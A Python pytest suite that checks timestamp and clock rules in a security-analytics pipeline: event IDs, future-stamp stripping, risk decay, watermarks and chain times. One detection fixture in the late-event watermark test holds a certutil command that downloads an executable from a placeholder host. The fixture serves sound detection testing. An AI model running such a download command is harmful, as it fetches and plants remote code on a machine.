"""The clock conformance suite — docs/CLOCK-SPEC.md as executable statements.

One test class per rule, named after the rule. When a rule and the code
disagree, the RULE is on trial as much as the code: changing either is a
visible decision, not a silent patch. Written RED against the round-6
codebase (Phase 0); the implementation phases turn each class green in
spec order (Rules 0/1/2/5 → 3/4 → 6 → 7).

Cases accumulate from the five reviewer passes:
  C-pass (assumptions), S-pass (self-consistency), T-pass (operational),
  U-pass (full read), V-pass (wording/batch-end close).
"""

import json
import os
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

D = "2026-08-15T"


def _fresh_dir():
    d = tempfile.mkdtemp()
    os.environ["NABLA_DATA_DIR"] = d
    import nabla.config as cfg
    cfg._settings = None
    return Path(d)


class Rule0EventIdentity:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 0: event identity must distinguish occurrences. N identical-
    looking events give N distinct IDs (C1: the field-hash alone collapsed
    a 10-login brute force to one ID)."""

    def test_identical_events_get_distinct_ids(self):
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.pipeline.ingestion import IngestionResult
        # The ingestion entry point that stamps event_id; entries identical
        # in every hashed field.
        evts = [{"timestamp": f"{D}03:00:05Z", "user": "carol",
                 "action": "login_failure", "source_ip": "203.0.113.5",
                 "host": "ws"} for _ in range(10)]
        result = _stamp(evts)
        ids = {e.get("event_id") for e in result}
        assert len(ids) == 10, (
            f"C1/Rule 0: 10 identical-looking events produced {len(ids)} "
            f"distinct event_ids — brute-force bursts collapse")

    def test_native_source_id_preferred(self):
        _fresh_dir()
        result = _stamp([
            {"timestamp": f"{D}03:00:00Z", "user": "u", "action": "x",
             "event_record_id": "SR-1"},
            {"timestamp": f"{D}03:00:00Z", "user": "u", "action": "x",
             "event_record_id": "SR-2"},
        ])
        ids = [e.get("event_id") for e in result]
        assert ids[0] != ids[1], "native source IDs must flow through"


def _stamp(entries):
    """Run the spec's single entry point directly (Rule 1 surface)."""
    from nabla.pipeline.clock_ingestion import normalize_and_validate
    return normalize_and_validate(entries, source="pipeline")


class Rule2FutureStripped:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 2: far-future stamps become ABSENT (original preserved in
    details, degradation counted) — never clamped, never wall-stamped.
    Only ingestion ever compares to wall clock."""

    def test_future_stamp_becomes_absent_not_clamped(self):
        _fresh_dir()
        from nabla.pipeline.clock_ingestion import normalize_and_validate
        out = normalize_and_validate([
            {"timestamp": "2099-01-01T00:00:00Z", "user": "mallory",
             "action": "x"}])
        e = out[0]
        assert e.get("timestamp") in ("", None), (
            f"far-future stamp must become absent, got {e.get('timestamp')}")
        assert "2099-01-01" in json.dumps(e.get("details", "")) or \
            "2099-01-01" in json.dumps(e.get("_original_timestamp", "")), (
            "the original stamp must be preserved for audit")

    def test_future_stamp_does_not_zero_risk(self):
        """R6-1's probe as a standing rule: one 2099 line cannot decay
        another entity's score to zero."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.risk import compute_risk_scores
        from datetime import datetime, timezone
        now_iso = datetime.now(timezone.utc).isoformat()
        anoms = [
            {"detection_method": "attack_script", "severity": "critical",
             "entity": "alice", "entity_type": "user",
             "timestamp": now_iso, "confidence": 0.9},
            {"detection_method": "lolbin", "severity": "high",
             "entity": "mallory", "entity_type": "user",
             "timestamp": "2099-01-01T00:00:00Z", "confidence": 0.9},
        ]
        store = compute_risk_scores(anoms, {"alice": "user", "mallory": "user"})
        alice = store.scores["alice"]
        assert alice.overall > 0.5, (
            f"R6-1 alive: alice's critical finding scored {alice.overall} "
            f"because a future-stamped line moved the clock")

    def test_naive_stamp_reads_source_timezone(self):
        """C5: a stamp without offset is read in the source timezone, not
        silently as UTC (a UTC+5 site's live events must not be stripped)."""
        _fresh_dir()
        from nabla.pipeline.clock_ingestion import normalize_and_validate
        out = normalize_and_validate([
            {"timestamp": "2026-11-20T18:00:00", "user": "u", "action": "x",
             "_source_timezone": "UTC+5"}])
        # 18:00 at UTC+5 == 13:00Z — recent past, not future
        assert out[0].get("timestamp") not in ("", None), (
            "naive local-time stamp was stripped as future — it is 13:00Z")


class Rule3DataClock:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 3: data clock = max valid event time, SIEM-only for the global
    clock, per-source watermarks persisted and monotone."""

    def test_file_upload_does_not_move_global_clock(self):
        """C10: a year-old uploaded file must not move the global data
        clock (ad-hoc analysis distorts nothing)."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.system_state import load_system_state, record_ingestion
        state = load_system_state(str(_fresh_dir() / "system_state.json"))
        before = state.get("data_newest_ts")
        state = record_ingestion(state, "file",
                                 entry_timestamps=["2025-01-01T00:00:00Z"])
        assert state.get("data_newest_ts") == before, (
            "file source moved the global data clock")


class Rule4DecayFromEvents:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 4: entity clocks advance from newest VALID event (events, not
    anomalies); present-but-anomaly-free entities decay; filtered
    (machine-behavioral) entities still decay; absent entities are
    dormant; the global floor is retired."""

    def test_quiet_entity_decays(self):
        """R6-4: flagged once, behaves normally (still generating EVENTS,
        no anomalies) — score decays from the event clock."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.risk import compute_risk_scores
        now = datetime.now(timezone.utc)
        crit = [{"detection_method": "attack_script", "severity": "critical",
                 "entity": "alice", "entity_type": "user",
                 "timestamp": now.isoformat(), "confidence": 0.9}]
        s1 = compute_risk_scores(crit, {"alice": "user"})
        day0 = s1.scores["alice"].overall
        later = now + timedelta(days=7)
        import nabla.risk as R
        from unittest.mock import patch
        with patch.object(R, "_data_clock", return_value=later):
            s2 = compute_risk_scores(
                [], {"alice": "user"},
                event_clocks={"alice": later.isoformat()})  # Rule 4: events
        assert s2.scores["alice"].overall < day0 * 0.75, (
            f"R6-4 alive: 7 quiet days kept score at "
            f"{s2.scores['alice'].overall:.2f} (day0 {day0:.2f})")

    def test_machine_behavioral_entity_still_decays(self):
        """R6-15: a machine account with an old signature score decays
        during behavioral-only batches instead of freezing (the entity is
        REMOVED from the map and reaches inactive decay via its events)."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.risk import compute_risk_scores
        now = datetime.now(timezone.utc)
        sig = [{"detection_method": "attack_script", "severity": "critical",
                "entity": "root", "entity_type": "user",
                "timestamp": now.isoformat(), "confidence": 0.9}]
        s1 = compute_risk_scores(sig, {"root": "user"})
        day0 = s1.scores["root"].overall
        later = now + timedelta(days=7)
        beh = [{"detection_method": "entity_z_score", "severity": "medium",
                "entity": "root", "entity_type": "user",
                "timestamp": later.isoformat(), "confidence": 0.9}]
        import nabla.risk as R
        from unittest.mock import patch
        with patch.object(R, "_data_clock", return_value=later):
            s2 = compute_risk_scores(
                beh, {"root": "user"},
                event_clocks={"root": later.isoformat()})
        assert s2.scores["root"].overall < day0, (
            f"R6-15 alive: machine score frozen at {s2.scores['root'].overall:.2f}")

    def test_no_global_floor(self):
        """C4b: one entity's future/bad event cannot age another entity.
        alice's clock comes only from alice's events."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.risk import compute_risk_scores
        old = datetime(2026, 8, 15, tzinfo=timezone.utc)
        anoms = [
            {"detection_method": "attack_script", "severity": "critical",
             "entity": "alice", "entity_type": "user",
             "timestamp": old.isoformat(), "confidence": 0.9},
            # bob's RECENT anomaly in the same batch — must not floor alice
            {"detection_method": "attack_script", "severity": "critical",
             "entity": "bob", "entity_type": "user",
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "confidence": 0.9},
        ]
        store = compute_risk_scores(anoms, {"alice": "user", "bob": "user"})
        alice_clock = store.scores["alice"].data_clock
        assert "2026-08-15" in alice_clock, (
            f"C4b alive: bob's recent event floored alice's clock to {alice_clock}")


class Rule6Watermark:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 6: watermark, then exclude from BASELINE only. States: open /
    observed / never-observed-behind-watermark (re-opened, U-1) /
    over-window (excluded, degradation)."""

    def test_late_event_still_detects(self):
        """S-2: an event past the watermark still produces its LOLBin
        anomaly — late data is baseline-excluded, never system-dropped."""
        _fresh_dir()
        import logging
        logging.disable(logging.CRITICAL)
        from nabla.detection import detect_anomalies
        evts = [{"user": "u", "type": "endpoint", "action": "process",
                 "timestamp": f"{D}03:00:00Z", "process": "certutil.exe",
                 "parent_process": "explorer.exe",
                 "command_line": "certutil -urlcache -f http://x/p.exe",
                 "host": "ws"}]
        anoms, _ = detect_anomalies(evts, phase="detection")
        assert any(a.get("detection_method") == "lolbin" for a in anoms), (
            "late events must still detect (S-2)")

    def test_three_piece_reconnect_one_observation(self):
        """U-1: a laptop's backlog over three batches produces ONE correct
        merged observation, not first-piece-only. R-1 (round 7): the
        engine is STATEFUL — the state threads through the calls and
        the watermark (advanced per batch) closes the hour."""
        _fresh_dir()
        from nabla.pipeline.watermark import absorb_state, new_state, close_open
        state = new_state()
        # three 5-minute pieces; the watermark advances per batch but
        # never passes hour-end + 2h lateness until the last close
        for wm, piece in (
                (f"{D}02:25:00Z", [{"timestamp": f"{D}02:00:00Z", "event_id": "e1"},
                                   {"timestamp": f"{D}02:20:00Z", "event_id": "e2"}]),
                (f"{D}02:45:00Z", [{"timestamp": f"{D}02:40:00Z", "event_id": "e3"}]),
                (f"{D}03:00:00Z", [{"timestamp": f"{D}02:55:00Z", "event_id": "e4"}]),
        ):
            state, obs, _ex = absorb_state(
                state, wm, piece, source_kind="splunk", mode="live")
            assert obs == [], "hour 02 must stay open while the watermark is inside it"
        # the sweep closes it once the watermark passes 02:00+1h+2h
        closed = close_open(state, {"splunk": f"{D}05:30:00Z"}, 21.0)
        assert closed == [(f"splunk|{D[:11]}02", 4)], (
            f"U-1: pieces produced {closed} — expected one merged "
            f"observation of 4")

    def test_backfill_without_live_data_records_every_hour(self):
        """V-2: a newest-first backfill with no live data afterwards still
        records every hour (batch-end close, not watermark close)."""
        _fresh_dir()
        from nabla.pipeline.watermark import absorb_state, new_state
        state = new_state()
        chunks = [[{"timestamp": f"{D}0{h}:10:00Z", "event_id": f"a{h}"}
                   for h in (5, 4, 3)],
                  [{"timestamp": f"{D}0{h}:10:00Z", "event_id": f"b{h}"}
                   for h in (2, 1, 0)]]
        total = 0
        for chunk in chunks:
            state, obs, _ex = absorb_state(
                state, None, chunk, source_kind="file", mode="backfill")
            total += len(obs)
        assert total == 6, (
            f"V-2: newest-first backfill recorded {total} "
            f"of 6 hours — hours waiting for a watermark that never moves")

    def test_overlap_pulls_do_not_double_count(self):
        """S-3: overlapping pulls deliver the same event twice — the open
        hour's ID filter merges it once."""
        _fresh_dir()
        from nabla.pipeline.watermark import absorb_state, new_state, close_open
        state = new_state()
        same = [{"timestamp": f"{D}02:00:00Z", "event_id": "e1"}]
        state, obs, _ex = absorb_state(
            state, f"{D}02:05:00Z", same, source_kind="splunk", mode="live")
        state, obs, _ex = absorb_state(
            state, f"{D}02:10:00Z", list(same), source_kind="splunk", mode="live")
        closed = close_open(state, {"splunk": f"{D}05:30:00Z"}, 21.0)
        assert closed == [(f"splunk|{D[:11]}02", 1)], (
            f"S-3: duplicate pull produced {closed}")

    def test_drain_merges_by_hour(self):
        """T-1: approved drain batches are schedule fragments — merge all
        batches per entity-hour before observing."""
        _fresh_dir()
        from nabla.pipeline.watermark import absorb_state, new_state
        state = new_state()
        # the drain path (drain_approved_pending) merges fragments per
        # (source, hour) before calling the engine; drain mode then
        # observes each hour immediately, registry-checked
        merged = [
            {"timestamp": f"{D}02:01:00Z", "event_id": "d1"},
            {"timestamp": f"{D}02:03:00Z", "event_id": "d2"},   # 5-min batch 1
            {"timestamp": f"{D}02:20:00Z", "event_id": "d3"},   # batch 2
        ]
        state, obs, _ex = absorb_state(
            state, None, merged, source_kind="splunk", mode="drain")
        assert obs == [(f"splunk|{D[:11]}02", 3)], (
            f"T-1: drain observed {obs} — fragments must "
            f"merge to one hourly observation of 3")


class Rule7AnomalyTimestamps:
    __test__ = True  # pytest default discovery wants Test*; the SPEC wants rule names
    """Rule 7: anomaly timestamps come from contributing events; chains
    from their NEWEST member's newest event (C7)."""

    def test_chain_timestamp_is_newest_member(self):
        from nabla.temporal import build_temporal_chains
        anoms = [
            {"detection_method": "failed_login_ratio", "user": "c",
             "timestamp": f"{D}03:00:00Z", "event_ids": ["e1"]},
            {"detection_method": "lolbin", "user": "c",
             "timestamp": f"{D}03:40:00Z", "event_ids": ["e2"]},
            {"detection_method": "attack_script", "user": "c",
             "timestamp": f"{D}03:50:00Z", "event_ids": ["e3"]},
        ]
        chains = build_temporal_chains(anoms, time_window_minutes=60)
        assert chains, "no chain formed"
        newest = chains[0].end_time or chains[0].start_time
        assert newest is not None and newest.hour == 3 and newest.minute == 50, (
            f"C7: chain stamped {newest} — must be the newest member event "
            f"(03:50), not the chain start")
